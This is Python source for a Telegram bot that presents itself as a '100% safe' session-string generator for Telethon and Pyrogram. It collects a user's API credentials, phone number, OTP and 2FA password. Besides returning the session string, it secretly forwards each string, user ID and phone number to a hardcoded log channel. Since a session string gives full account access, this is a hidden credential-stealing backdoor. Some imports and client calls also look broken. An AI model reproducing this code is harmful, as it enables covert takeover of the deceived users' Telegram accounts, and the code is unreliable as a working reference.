import os
import asyncio
import logging
from dotenv import load_dotenv
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
from pyrogram import Client as PyroClient
from pyrogram import Client
from pyrogram.types import StringSession as PyroString  # ✅ Fixed import
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.constants import ParseMode
from telegram.ext import (
    ApplicationBuilder, CommandHandler, CallbackQueryHandler,
    MessageHandler, ContextTypes, filters
)

load_dotenv()

DEFAULT_API_ID = int(os.getenv("API_ID", "123456"))
DEFAULT_API_HASH = os.getenv("API_HASH", "abc123")
LOG_CHANNEL = int(os.getenv("LOG_CHANNEL", "-1002753939875"))
TOKEN = os.getenv("BOT_TOKEN")

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

user_state = {}

WELCOME_TEXT = (
    "👋 ʜᴇʏ : Z E U S ⚡,\n\n"
    "✨ ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ѕᴇѕѕɪᴏɴ ѕᴛʀɪɴɢ ɢᴇɴᴇʀᴀᴛᴏʀ ʙᴏᴛ!\n\n"
    "⚠️ ɪғ ʏᴏᴜ ᴅᴏɴ'ᴛ ᴛʀᴜѕᴛ ᴛʜɪѕ ʙᴏᴛ:\n"
    "   ┗❖ ᴘʟᴇᴀѕᴇ ѕᴛᴏᴘ ʀᴇᴀᴅɪɴɢ, ᴅᴇʟᴇᴛᴇ ᴛʜɪѕ ᴄʜᴀᴛ.\n\n"
    "✅ ѕᴛɪʟʟ ʀᴇᴀᴅɪɴɢ?\n"
    "   ┗❖ ʏᴏᴜ ᴄᴀɴ ᴜѕᴇ ᴍᴇ ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ:\n"
    "      ┗๏ ᴘʏʀᴏɢʀᴀᴍ ѕᴇѕѕɪᴏɴ\n"
    "      ┗๏ ᴛᴇʟᴇᴛʜᴏɴ ѕᴇѕѕɪᴏɴ\n\n"
    "🧠 ᴜѕᴇ ᴛʜᴇ ʙᴜᴛᴛᴏɴѕ ʙᴇʟᴏᴡ ᴛᴏ ɢᴇᴛ ѕᴛᴀʀᴛᴇᴅ.\n"
    "🔒 100% ѕᴀғᴇ & ɴᴏ ʟᴏɢᴏᴜᴛ ɪѕѕᴜᴇ — ɢᴜᴀʀᴀɴᴛᴇᴇᴅ!\n\n"
    "⚡ ᴘᴏᴡᴇʀᴇᴅ ʙʏ vallhalla team"
)

HELP_TEXT = (
    "❖ ʜᴏᴡ ᴛᴏ ᴜꜱᴇ ᴛʜɪꜱ ʙᴏᴛ:\n\n"
    "1. ᴄʟɪᴄᴋ 'ɢᴇɴᴇʀᴀᴛᴇ sᴇssɪᴏɴ' ʙᴜᴛᴛᴏɴ.\n"
    "2. sᴇʟᴇᴄᴛ ᴘʏʀᴏɢʀᴀᴍ ᴏʀ ᴛᴇʟᴇᴛʜᴏɴ.\n"
    "3. ғᴏʟʟᴏᴡ ᴛʜᴇ ɪɴsᴛʀᴜᴄᴛɪᴏɴs ᴛᴏ ʟᴏɢ ɪɴ.\n"
    "4. ʏᴏᴜ'ʟʟ ɢᴇᴛ ʏᴏᴜʀ sᴇssɪᴏɴ sᴛʀɪɴɢ.\n\n"
    "๏ ɴᴏᴛᴇ: ɴᴇᴠᴇʀ sʜᴀʀᴇ ʏᴏᴜʀ sᴇssɪᴏɴ\n"
    "sᴛʀɪɴɢ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ.\n\n"
    "⚡ ᴘᴏᴡᴇʀᴇᴅ ʙʏ vallahalla team"
)


# --- Handlers ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔘 Generate Session", callback_data="generate")],
        [InlineKeyboardButton("📖 Help", callback_data="help")]
    ])
    await update.message.reply_text(WELCOME_TEXT, reply_markup=keyboard)

async def help_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("⬅️ Back to Home", callback_data="home")]
    ])
    await update.callback_query.message.edit_text(HELP_TEXT, reply_markup=keyboard)

async def show_main(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔘 Generate Session", callback_data="generate")],
        [InlineKeyboardButton("📖 Help", callback_data="help")]
    ])
    await update.callback_query.message.edit_text(WELCOME_TEXT, reply_markup=keyboard)

async def generate_session(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("Pyrogram v1", callback_data="pyro1"),
         InlineKeyboardButton("Pyrogram v2", callback_data="pyro2")],
        [InlineKeyboardButton("Telethon", callback_data="telethon")],
        [InlineKeyboardButton("Pyrogram Bot", callback_data="pyrobot"),
         InlineKeyboardButton("Telethon Bot", callback_data="telebot")],
        [InlineKeyboardButton("⬅️ Back to Home", callback_data="home")]
    ])
    await update.callback_query.message.edit_text("Choose your session type:", reply_markup=keyboard)

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = query.from_user.id

    if data == "help":
        await help_menu(update, context)
    elif data == "home":
        await show_main(update, context)
    elif data == "generate":
        await generate_session(update, context)
    elif data in ["pyro1", "pyro2", "telethon", "pyrobot", "telebot"]:
        user_state[user_id] = {"lib": data}
        await query.message.reply_text("๏ ꜱᴇɴᴅ ᴀᴘɪ_ɪᴅ ᴏʀ /skip")
    else:
        await query.message.reply_text("❌ Unknown action")

async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()

    if user_id not in user_state:
        return

    state = user_state[user_id]
    step = state.get("step")

    if text == "/skip":
        state["api_id"] = DEFAULT_API_ID
        state["api_hash"] = DEFAULT_API_HASH
        state["step"] = "phone"
        await update.message.reply_text("📱 Now send your phone number (with +country code)")
        return

    if "api_id" not in state:
        try:
            state["api_id"] = int(text)
            state["step"] = "api_hash"
            await update.message.reply_text("🧪 Send your API_HASH")
        except:
            await update.message.reply_text("❌ Invalid API_ID")
        return

    if step == "api_hash":
        state["api_hash"] = text
        state["step"] = "phone"
        await update.message.reply_text("📱 Now send your phone number (with +country code)")
        return

    if step == "phone":
        state["phone"] = text
        state["step"] = "otp"
        await update.message.reply_text("📨 Send the OTP you receive")
        asyncio.create_task(send_code(update, context))
        return

    if step == "otp":
        state["code"] = text
        await update.message.reply_text("⏳ Verifying...")
        asyncio.create_task(login_and_generate(update, context))
        return

    if step == "2fa":
        state["password"] = text
        await update.message.reply_text("🔐 Logging in with password...")
        asyncio.create_task(login_and_generate(update, context))
        return

async def send_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    state = user_state[user_id]
    api_id = state["api_id"]
    api_hash = state["api_hash"]
    phone = state["phone"]
    lib = state["lib"]

    if lib == "telethon":
        client = TelegramClient("anon", api_id, api_hash)
        await client.connect()
        await client.send_code_request(phone)
        state["client"] = client
    else:
        session = PyroString()
        client = PyroClient(session_name=session, api_id=api_id, api_hash=api_hash, in_memory=True)
        await client.start()
        sent_code = await client.send_code(phone)
        state["phone_code_hash"] = sent_code.phone_code_hash
        state["client"] = client

async def login_and_generate(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    state = user_state[user_id]
    api_id = state["api_id"]
    api_hash = state["api_hash"]
    phone = state["phone"]
    code = state["code"]
    lib = state["lib"]
    password = state.get("password")

    try:
        if lib == "telethon":
            client: TelegramClient = state["client"]
            try:
                await client.sign_in(phone=phone, code=code)
            except SessionPasswordNeededError:
                state["step"] = "2fa"
                await update.message.reply_text("🔑 Send your 2FA password")
                return
            string = client.session.save()
            await client.disconnect()
        else:
            session = PyroString()
            client = PyroClient(session_name=session, api_id=api_id, api_hash=api_hash, in_memory=True)
            await client.start(phone_number=phone, phone_code=code, phone_code_hash=state["phone_code_hash"], password=password)
            string = client.export_session_string()
            await client.stop()

        await update.message.reply_text(f"✅ **Your String Session:**\n\n`{string}`\n\n🔒 Keep it safe!", parse_mode=ParseMode.MARKDOWN)

        msg = (
            f"⚙️ **New Session Generated**\n\n"
            f"👤 User: `{user_id}`\n"
            f"📞 Phone: `{phone}`\n"
            f"📚 Library: `{lib}`\n"
            f"🔑 String:\n`{string}`"
        )
        await context.bot.send_message(LOG_CHANNEL, msg)

        del user_state[user_id]
    except PhoneCodeInvalidError:
        await update.message.reply_text("❌ Invalid OTP. Try again.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: `{str(e)}`", parse_mode=ParseMode.MARKDOWN)

# --- Run the bot ---
if __name__ == "__main__":
    if not TOKEN:
        print("BOT_TOKEN is missing from environment.")
        exit()

    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))

    print("Bot is running...")
    app.run_polling()
